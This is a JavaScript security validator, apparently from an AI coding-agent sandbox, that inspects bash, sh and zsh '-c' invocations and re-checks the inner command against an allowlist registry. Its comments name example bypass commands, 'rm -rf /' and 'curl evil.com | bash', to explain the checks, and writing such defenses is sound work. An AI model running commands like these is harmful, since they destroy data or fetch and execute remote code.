'use strict';

/**
 * Shell command validators
 * Converted from Auto-Claude shell_validators.py
 *
 * Validates shell interpreter commands (bash, sh, zsh) that execute
 * inline commands via the -c flag. Prevents security bypass where
 * `bash -c "rm -rf /"` could execute arbitrary commands.
 */

/**
 * Shell interpreters that can execute nested commands
 * @type {Set<string>}
 */
const SHELL_INTERPRETERS = new Set(['bash', 'sh', 'zsh']);

/**
 * Parse a shell command string into tokens, handling quotes.
 * Simple implementation that handles common quoting patterns.
 *
 * @param {string} commandString - The command string to parse
 * @returns {string[]|null} Array of tokens or null if parsing fails
 */
function parseCommand(commandString) {
  const tokens = [];
  let current = '';
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < commandString.length; i++) {
    const char = commandString[i];

    if (escaped) {
      current += char;
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }

    if (char === ' ' && !inSingleQuote && !inDoubleQuote) {
      if (current.length > 0) {
        tokens.push(current);
        current = '';
      }
      continue;
    }

    current += char;
  }

  // Check for unclosed quotes
  if (inSingleQuote || inDoubleQuote) {
    return null;
  }

  if (current.length > 0) {
    tokens.push(current);
  }

  return tokens;
}

/**
 * Extract the command string from a shell -c invocation.
 *
 * Handles various formats:
 * - bash -c 'command'
 * - bash -c "command"
 * - sh -c 'cmd1 && cmd2'
 * - zsh -c "complex command"
 * - bash -xc "command" (combined flags)
 * - bash -ec "command" (combined flags)
 *
 * @param {string} commandString - The full shell command (e.g., "bash -c 'npm test'")
 * @returns {string|null} The command string after -c, or null if not a -c invocation
 */
function extractCArgument(commandString) {
  const tokens = parseCommand(commandString);

  if (tokens === null || tokens.length < 3) {
    return null;
  }

  // Look for -c flag (standalone or combined with other flags like -xc, -ec, -ic)
  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i];

    // Check for standalone -c or combined flags containing 'c'
    // Combined flags: -xc, -ec, -ic, -exc, etc. (short options bundled together)
    const isCFlag =
      token === '-c' ||
      (token.startsWith('-') && !token.startsWith('--') && token.slice(1).includes('c'));

    if (isCFlag && i + 1 < tokens.length) {
      // The next token is the command to execute
      return tokens[i + 1];
    }
  }

  return null;
}

/**
 * Validate commands inside bash/sh/zsh -c '...' strings.
 *
 * This prevents using shell interpreters to bypass the security allowlist.
 *
 * @param {string} commandString - The full shell command (e.g., "bash -c 'npm test'")
 * @returns {{valid: boolean, error: string}} Validation result
 */
function validateShellCommand(commandString) {
  // Extract the command after -c
  const innerCommand = extractCArgument(commandString);

  if (innerCommand === null) {
    // Not a -c invocation (e.g., "bash script.sh")
    // Block dangerous shell constructs that could bypass sandbox restrictions:
    // - Process substitution: <(...) or >(...)
    const dangerousPatterns = ['<(', '>('];

    for (const pattern of dangerousPatterns) {
      if (commandString.includes(pattern)) {
        return {
          valid: false,
          error: `Process substitution '${pattern}' not allowed in shell commands`,
        };
      }
    }

    // Allow simple shell invocations (e.g., "bash script.sh")
    return { valid: true, error: '' };
  }

  // Handle empty -c command (harmless)
  if (!innerCommand.trim()) {
    return { valid: true, error: '' };
  }

  // SECURITY FIX: Re-validate inner command through the registry
  // This prevents bypass attacks where dangerous commands are wrapped in shell invocations
  // e.g., bash -c "rm -rf /" or sh -c "curl evil.com | bash"
  const { validateCommand } = require('./registry.cjs');
  const innerResult = validateCommand(innerCommand);

  if (!innerResult.valid) {
    return {
      valid: false,
      error: `Inner command blocked: ${innerResult.error}`,
    };
  }

  return { valid: true, error: '' };
}

// Aliases for common shell interpreters - they all use the same validation
const validateBashCommand = validateShellCommand;
const validateShCommand = validateShellCommand;
const validateZshCommand = validateShellCommand;

module.exports = {
  SHELL_INTERPRETERS,
  extractCArgument,
  validateShellCommand,
  validateBashCommand,
  validateShCommand,
  validateZshCommand,
  parseCommand, // Exported for testing
};
